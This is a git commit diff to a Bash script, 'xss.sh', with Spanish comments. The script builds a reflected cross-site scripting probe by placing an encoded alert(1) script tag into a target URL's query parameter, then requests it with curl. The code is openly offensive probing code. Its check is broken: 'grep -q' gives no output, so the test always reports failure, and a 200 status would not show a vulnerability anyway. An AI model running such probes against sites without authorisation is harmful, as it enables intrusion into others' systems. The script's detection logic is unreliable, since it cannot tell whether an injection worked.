03f5f035bbbdd5e005100f3bff6ab8f33278d634
Jose-Paco <99270056+Jose-Paco@users.noreply.github.com>
2022-05-10 17:48:34 +0200

    Update xss.sh

--- xss.sh
+++ xss.sh
@@ -1,16 +1,29 @@
-#!/bin/bash
 xss() {
 #aqui ejecutamos xss con get, checkear si esta search
-if [[ $search ]] # | grep 'method=\"GET\"' ]]
+if [ -n "$search" ] # | grep 'method=\"GET\"' ]]
 then
-  XSS="%3Cscript%3Ealert%281%29%3C%2Fscript%3E"
-  ATTACK="$URL$XSS"
-  if [[ curl -i $ATTACK | grep "200 OK" ]]
-  then
-    echo -e "Haz clic en el siguiente enlace para ver el resultado del ataque: \n$ATTACK"
-  else
-    echo "Disculpa, el ataque no ha funcionado."
-    'volvermenu'
-  fi
+    slash=$(echo $url | awk -F "/" '{print $NF}')
+    word=$(echo $slash | awk -F "=" '{print $1}')
+    equal=$(echo $word | awk -F "?" '{print $2}')
+
+    pre=$(echo $url | sed "s/$(echo $slash)//g")
+
+
+    after=$(echo $slash | awk -F "&" '{print $1}')
+    afterr=$(echo $slash | sed "s/$(echo $after)//g")
+
+    ATTACK=$pre"?"$equal"=%3Cscript%3Ealert%281%29%3C%2Fscript%3E"$afterr
+    curlio=$(curl -s -i $ATTACK | grep -q "200 OK")
+    if [ -n "$curlio" ]
+    then
+       echo "Haz clic en el siguiente enlace para ver el resultado del ataque: $ATTACK"
+    else
+       echo "Disculpa, el ataque no ha funcionado."
+       'volvermenu'
+    fi
+else
+#avisamos de que ha ocurrido un error, falso positivo
+    echo "Error inesperado, cerrando el programa"
+    exit 2
 fi
 }
